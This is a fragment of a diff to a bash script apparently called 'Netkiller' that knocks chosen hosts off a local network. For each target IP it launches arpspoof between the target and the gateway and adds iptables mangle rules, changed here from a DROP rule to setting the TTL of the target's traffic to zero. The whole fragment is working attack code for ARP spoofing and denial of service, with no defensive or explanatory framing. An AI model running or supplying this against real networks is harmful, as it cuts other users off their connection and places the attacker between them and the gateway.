@@ -227,8 +227,9 @@ echo " "
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
-     iptables -t mangle -A PREROUTING -s "$TARGET" -j DROP
-   ( arpspoof -i "$INTERFACE" -c both -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
+     iptables -t mangle -I PREROUTING -s "$TARGET" -j TTL --ttl-set 0
+     iptables -t mangle -I PREROUTING -d "$TARGET" -j TTL --ttl-set 0
+   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
     PIDS+=($!)
 done
 
